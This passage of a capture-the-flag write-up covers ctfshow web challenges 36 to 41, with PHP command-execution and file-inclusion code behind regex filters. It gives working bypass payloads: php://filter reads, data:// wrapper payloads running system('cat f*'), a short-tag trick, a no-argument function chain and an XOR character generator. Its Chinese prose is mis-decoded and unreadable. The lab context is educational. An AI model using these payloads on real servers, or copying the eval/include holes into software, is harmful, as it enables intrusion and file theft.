data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span>url<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// åˆ©ç”¨ include ç»“åˆä¼ªåè®®åŒ…å«è¯»å–</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;588e57f9-b27c-4268-832c-ff6e730f463c&#125;
</code></pre><h2 id="web36"><a class="anchor" href="#web36">#</a> web36</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 04:21:16</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿‡æ»¤å‡çº§ï¼Œæ·»åŠ äº† / å’Œ 0-9 çš„æ•°å­—</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span>url<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// åˆ©ç”¨ include ç»“åˆä¼ªåè®®åŒ…å«è¯»å–</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;4f3d6214-9a2f-4161-9e22-0b7d499974c9&#125;
</code></pre><h2 id="web37"><a class="anchor" href="#web37">#</a> web37</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 05:18:55</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">//flag in flag.php</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        </pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿‡æ»¤äº† flagï¼Œæ˜¯ include æ–‡ä»¶åŒ…å«</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload1:</pre></td></tr><tr><td data-num="2"></td><td><pre>?c=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>//data://å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œ</pre></td></tr><tr><td data-num="4"></td><td><pre>    </pre></td></tr><tr><td data-num="5"></td><td><pre>payload2ï¼š</pre></td></tr><tr><td data-num="6"></td><td><pre>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</pre></td></tr><tr><td data-num="7"></td><td><pre>//base64ç¼–ç å†…å®¹æ˜¯<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;18f0b970-3518-43ba-bb0b-293ead0fb0e7&#125;
</code></pre><h2 id="web38"><a class="anchor" href="#web38">#</a> web38</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 05:23:36</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">//flag in flag.php</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|php|file/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        </pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿‡æ»¤å‡çº§ï¼Œæ·»åŠ äº† php å’Œ file çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;9eb90688-af2b-4954-abbb-87990f68352e&#125;
</code></pre><h2 id="web39"><a class="anchor" href="#web39">#</a> web39</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 06:13:21</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">//flag in flag.php</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>.php å› ä¸ºå‰é¢çš„ php è¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„.php ä¼šè¢«å½“æˆ html é¡µé¢ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œèµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨ï¼Œä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre>?c=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;f3b87a5e-30ff-4dbc-a558-0ed3ba514721&#125;
</code></pre><h2 id="web40"><a class="anchor" href="#web40">#</a> web40</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 06:03:36</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¼•å·ã€ç¾å…ƒç¬¦å·ã€å†’å·ï¼Œè¿™é‡Œå¯ä»¥æ„é€ æ— å‚æ•°å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œæ­£åˆ™ä¸­çš„æ‹¬å·ä¸æ˜¯è‹±æ–‡çš„ æ˜¯è¿‡æ»¤äº†ä¸­æ–‡çš„æ‹¬å·</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre>localeconv ()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å· (.)</pre></td></tr><tr><td data-num="5"></td><td><pre>pos ()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</pre></td></tr><tr><td data-num="6"></td><td><pre>scandir ()ï¼šè·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</pre></td></tr><tr><td data-num="7"></td><td><pre>array_reverse ()ï¼šæ•°ç»„é€†åº </pre></td></tr><tr><td data-num="8"></td><td><pre>next ()ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ </pre></td></tr><tr><td data-num="9"></td><td><pre>show_source ()ï¼šå¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤º</pre></td></tr><tr><td data-num="10"></td><td><pre>é¦–å…ˆé€šè¿‡ pos (localeconv ()) å¾—åˆ°ç‚¹å·ï¼Œå› ä¸º scandir (â€™.â€™) è¡¨ç¤ºå¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ scandir (pos (localeconv ())) å°±èƒ½å¾—åˆ° flag.php äº†</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr></table></figure><pre><code>ctfshow&#123;d100f4e0-8aba-4c75-837e-d67a710889f0&#125;
</code></pre><h2 id="web41"><a class="anchor" href="#web41">#</a> web41</h2><p>è¿‡æ»¤ä¸ä¸¥ï¼Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: ç¾½</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:31:22</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 22:40:07</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: 1341963450@qq.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctf.show</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯è¿˜æœ‰ä¸€äº›ç¬¦å·ï¼Œæˆ‘ä»¬å€Ÿç”¨å¤§ä½¬çš„è„šæœ¬å…ˆç”Ÿæˆä¸€ä¸ª ascii ç çš„æ–‡æœ¬</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// å¤§ä½“æ„æ€å°±æ˜¯ä»è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶ååœ¨åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>			<span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token 